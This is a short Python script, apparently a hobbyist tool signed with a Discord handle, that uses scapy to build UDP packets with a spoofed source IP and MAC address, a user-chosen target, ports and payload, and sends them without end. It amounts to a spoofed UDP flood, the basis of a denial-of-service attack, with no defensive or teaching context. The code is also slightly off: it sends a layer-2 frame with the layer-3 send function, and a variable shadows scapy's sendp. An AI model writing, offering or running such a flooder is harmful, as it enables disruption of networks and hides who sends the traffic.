#Imports
import scapy
from scapy.all import *
import socket


choice = ""

#General Code
def toystory():
    print("UDP Only")


    SIP = input("Spoofed IP: ")
    print(" ")
    print("Soofed IP ->", SIP)
    print(" ")
    SMAC = input("Spoofed Mac-Address: ")
    print(" ")
    print("Spoofed Mac ->", SMAC)
    print(" ")
    DIP = input("Destination IP: ")
    print(" ")
    print("Destination IP ->", DIP)
    print(" ")
    SP = int(input("Source Port: "))
    print("Source Port ->", SP)
    print(" ")
    DP = int(input("Destination Port: "))
    print(" ")        
    print("Destination Port ->", DP)
    print(" ")
    PP = input("Payload: ")
    print(" ")
    print("Payload ->", PP)
    print(" ")


    while True:
        sendp = (Ether(src = SMAC)/IP(src = SIP, dst = DIP,) / UDP(sport = SP, dport = DP) / PP)
        send(sendp, verbose = True)

WLoop = True
while WLoop:
    toystory()
    
#Credits:
#Made by: Tempest#8933
#Improved by: N/A
